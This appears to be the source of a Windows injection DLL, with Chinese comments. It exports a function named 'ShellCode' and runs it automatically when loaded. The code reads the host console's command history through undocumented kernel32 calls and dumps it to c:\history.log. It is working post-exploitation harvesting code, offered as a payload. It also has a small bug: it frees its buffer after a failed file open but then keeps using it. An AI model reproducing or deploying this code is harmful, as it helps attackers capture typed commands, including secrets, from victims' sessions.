#include "stdafx.h"

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <Tlhelp32.h>

typedef DWORD (__stdcall*MYGetConsoleCommandHistoryLengthW)(LPWSTR ExeName);
typedef DWORD (__stdcall*MYGetConsoleCommandHistoryW)(LPWSTR Commands, DWORD CommandBufferLength, LPWSTR ExeName);

extern "C" __declspec(dllexport) void ShellCode()
{
    //1.获取当前进程名称
    DWORD dwId = GetCurrentProcessId();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    wchar_t convertTemp1[256] = {0};
    if(hSnapshot) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if(Process32First(hSnapshot, &pe32)) {
            do {
                if(pe32.th32ProcessID == dwId)
                {
                    MultiByteToWideChar(CP_UTF8, 0, pe32.szExeFile, strlen(pe32.szExeFile), convertTemp1, 256); 
                }
            } while(Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    //2.获取要调用的函数并获取历史命令
    HMODULE hMod = LoadLibraryA("kernel32.dll");
    MYGetConsoleCommandHistoryLengthW fun1 = (MYGetConsoleCommandHistoryLengthW)GetProcAddress(hMod, "GetConsoleCommandHistoryLengthW");
    MYGetConsoleCommandHistoryW fun2 = (MYGetConsoleCommandHistoryW)GetProcAddress(hMod, "GetConsoleCommandHistoryW");
    DWORD dwLen = fun1(convertTemp1);
    wchar_t* pHistoryBuf = NULL;
    if (dwLen != 0)
    {
        pHistoryBuf = (wchar_t *)malloc(dwLen);
        fun2((LPWSTR)pHistoryBuf, dwLen, convertTemp1);
    }
    //3.输出到文件
    if (pHistoryBuf != NULL)
    {
        HANDLE hHisotryFile = CreateFile("c:\\history.log", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hHisotryFile == 0)
        {
            free(pHistoryBuf);
        }
        char szBufNewLine[] = {"\r\n"};
        DWORD dwRWSize = 0;
        for (DWORD i = 0; i < (dwLen / 2); i++)
        {
            if (pHistoryBuf[i] == 0x00)
            {
                WriteFile(hHisotryFile, szBufNewLine, 2, &dwRWSize, NULL);
            }
            else
            {
                WriteFile(hHisotryFile, &pHistoryBuf[i], 1, &dwRWSize, NULL);
            }

        }
        CloseHandle(hHisotryFile);
    }
}

bool APIENTRY DllMain(HANDLE hinstDLL,DWORD fdwReason,LPVOID lpReserved )
{
    switch( fdwReason ) 
    { 
    case DLL_PROCESS_ATTACH:
        ShellCode();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return true;
}
